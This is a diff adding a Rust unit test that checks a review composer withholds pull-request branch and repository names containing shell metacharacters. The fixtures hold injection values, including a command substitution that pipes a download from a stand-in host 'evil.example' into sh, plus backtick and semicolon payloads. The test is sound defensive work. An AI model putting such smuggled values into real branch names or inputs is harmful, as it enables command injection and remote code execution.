@@ -166,3 +166,17 @@ fn a_profile_of_only_the_marker_is_empty_and_skipped() {
         }]
     );
 }
+
+#[test]
+fn a_name_that_could_run_in_a_shell_is_withheld() {
+    let (found, mut pr) = pull_request();
+    pr.head_ref = "x$(curl${IFS}evil.example|sh)".into();
+    pr.base_ref = "`id`".into();
+    pr.head_repository = Some("a;b/c".into());
+    let profile = replacing("{{ pr_head_ref }}|{{ pr_base_ref }}|{{ pr_head_repository }}");
+    let withheld = "(name withheld: unsafe characters; use the SHA)";
+    assert_eq!(
+        compose_review(&found, &pr, None, Some(&profile), ""),
+        format!("{withheld}|{withheld}|{withheld}")
+    );
+}
